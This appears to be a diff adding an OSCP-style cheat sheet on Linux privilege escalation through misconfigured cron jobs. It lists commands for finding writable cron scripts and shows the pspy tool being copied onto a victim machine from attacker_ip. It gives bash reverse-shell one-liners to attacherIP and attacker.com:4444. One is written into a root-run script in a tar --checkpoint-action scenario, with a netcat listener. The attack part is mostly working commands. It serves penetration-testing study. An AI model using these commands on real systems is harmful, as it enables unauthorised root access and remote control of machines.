@@ -1,3 +1,102 @@
-This section covers techniques for exploiting misconfigured or insecure scheduled tasks (cron jobs) to escalate privileges on Linux systems. Includes real-world OSCP-style examples, custom scripts, and common misconfigurations such as writable scripts, world-writable directories, environment variable manipulation, and abuse of wildcards or timing gaps.
-Enumaration: look around the system for any writeable files or directories : find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+This section covers techniques for exploiting misconfigured or insecure scheduled tasks (cron jobs) to escalate privileges on Linux systems.    Includes real-world OSCP-style examples, custom scripts, and common misconfigurations such as writable scripts, world-writable directories,     environment variable manipulation, and abuse of wildcards or timing gaps.
+=========================================================================================================================================
+  Enumaration:
+----------------------------------------------------------------------------------------
+      look around the system for any writeable files or directories :
+          find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+
+      Check for World-Writable Cron Scripts
+          find /etc/cron* -type f -writable 2>/dev/null
+
+      Check for World-Writable Directories Executed by Cron
+          find /etc/cron* -type d -perm -0002 2>/dev/null
+      
+      List Cron Jobs of Other Users 
+          crontab -l
+          ls -la /etc/cron.daily/
+          cat /etc/crontab
+
+      List User Cron Jobs
+          crontab -l
+
+      List Cron Jobs of Other Users (if you have permission)
+          crontab -u <username> -l
+
+      Check System-Wide Cron Jobs
+          ls -la /etc/cron*
+          cat /etc/crontab
+
+      Check Hourly, Daily, Weekly, Monthly Cron Jobs
+          ls -l /etc/cron.{hourly,daily,weekly,monthly}
+
+      Look for Scripts in /etc/crontab
+          cat /etc/crontab
+
+      List Cron Jobs in /etc/cron.d
+          ls -la /etc/cron.d/
+          cat /etc/cron.d/*
+
+      Find All Executables Referenced in Cron Jobs
+          grep -r '' /etc/cron* | grep -v '^#'
+          ls -l /path/to/script.sh
+
+      Search for Suspicious Wildcards (Used in Exploits)
+      grep -r "\*" /etc/cron*
+
+-----------------------------------------------------------------------------------------
+      You can use "pspy" for snoop on processes without need for root permissions (https://github.com/DominicBreuker/pspy)
+          Steps to Use pspy:
+
+            Download pspy on your local machine
+              You can use:
+              uname -m : on the victim machine to check the architecture.
+
+            Transfer pspy to the victim machine : Use scp or python -m http.server to transfer the binary:
+              Using scp:  scp pspy64 user@victim_ip:/tmp
+              Using python3 -m http.server:
+                On your local machine
+                  cd path/to/pspy
+                     python3 -m http.server 8080
+                 On the victim machine:
+                    wget http://attacker_ip:8080/pspy64 -O /tmp/pspy
+                    chmod +x /tmp/pspy
+                    Run pspy on the victim
+                    ./pspy -i 1000
+=========================================================================================================================================
+  Exploitation
+-------------------------------------------------------------------------
+   Add this code to world-writable script: 
+       bash -i >& /dev/tcp/attacherIP/Port 0>&1
+-------------------------------------------------------------------------
+Real-World Scenario: Privilege Escalation via tar and --checkpoint-action=exec
+
+🏢 Context
+On a production Linux server, a backup script is set up by the system administrator to archive web application files daily using tar. The cron job is:
+      tar -cf /backups/site-$(date +%F).tar /var/www/html
+
+A junior sysadmin modifies it to display progress during large backups, so they use:
+      tar --checkpoint=100 --checkpoint-action=exec=echo "Checkpoint hit" -cf /backups/site-$(date +%F).tar /var/www/html
+
+Later, they change it to execute a custom script instead of echo:
+      tar --checkpoint=100 --checkpoint-action=exec=/usr/local/bin/notify.sh -cf /backups/site.tar /var/www/html
+
+This script is owned by root and not properly secured:
+      -rwxrwxrwx 1 root root  /usr/local/bin/notify.sh
+
+🧑‍💻 Attacker’s Position
+	•	Attacker is a low-privileged user (www-data)
+	•	Can write files into /var/www/html (e.g., via file uploads)
+	•	Knows that tar runs every night as root and executes a script (notify.sh) they can modify
+
+💣 The Exploit
+Step 1: Modify the script
+As a low-privileged user:
+      echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" > /usr/local/bin/notify.sh
+      chmod +x /usr/local/bin/notify.sh
+
+Step 2: Set up a listener
+On attacker’s machine:
+      nc -lvnp 4444
+
+
 
